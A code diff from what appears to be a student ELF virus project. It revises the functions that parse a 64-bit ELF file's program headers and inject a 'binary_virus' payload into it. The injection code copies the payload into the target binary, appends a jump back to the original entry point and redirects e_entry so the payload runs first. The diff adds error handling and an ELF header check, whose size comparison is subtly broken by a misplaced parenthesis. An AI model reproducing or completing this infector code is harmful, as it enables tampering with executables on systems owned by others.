@@ -2,6 +2,7 @@
 
 static int		inject_code(Elf64_Ehdr *map, int maxaddr, int maxoff)
 {
+	int		retval;
 	int		fd;
 	void		*binary_virus;
 	long long int	size;
@@ -18,19 +19,44 @@ static int		inject_code(Elf64_Ehdr *map, int maxaddr, int maxoff)
 	*((char *)((void *)map + maxoff + size)) = 0xe9;
 	*((int *)((void *)map + maxoff + size + 1)) = map->e_entry - (maxaddr + 5 + size);
 	map->e_entry = maxaddr;
-	memcpy((void *)map + maxoff, binary_virus, size);
-	munmap(binary_virus, size);
-	close(fd);
-	return 0;
+	ft_memcpy((void *)map + maxoff, binary_virus, size);
+	retval = 0;
+	if (munmap(binary_virus, size) < 0) {
+		perror("munmap");
+		retval = -1;
+	}
+	if (close(fd) < 0) {
+		perror("close");
+		retval = -1;
+	}
+	return retval;
 }
 
-int	parse_ph_64(Elf64_Ehdr *map)
+static int		check_file_ident(Elf64_Ehdr *map, long long int const size)
+{
+	(void)size;
+	if (map->e_ident[EI_MAG0] == ELFMAG0
+	 && map->e_ident[EI_MAG1] == ELFMAG1
+	 && map->e_ident[EI_MAG2] == ELFMAG2
+	 && map->e_ident[EI_MAG3] == ELFMAG3
+	 && map->e_ident[EI_CLASS] == ELFCLASS64) {
+		if (map->e_ehsize + (map->e_phentsize * map->e_phnum)
+		 + (map->e_shentsize * map->e_shnum < size))
+			return 0;
+	}
+	dprintf(STDERR_FILENO, "Error: invalid file format\n");
+	return -1;
+}
+
+int	parse_ph_64(Elf64_Ehdr *map, long long int const size)
 {
 	Elf64_Phdr	*tmp;
 	unsigned int	maxaddr;
 	int		maxoff;
 	int		i;
 
+	if (check_file_ident(map, size) < 0)
+		return -1;
 	maxaddr = 0x0;
 	maxoff = 0x0;
 	if (map->e_phnum > 0) {
@@ -47,5 +73,6 @@ int	parse_ph_64(Elf64_Ehdr *map)
 	}
 	if (maxaddr == 0)
 		return -1;
+	//if (maxaddr)
 	return inject_code(map, maxaddr, maxoff);
 }
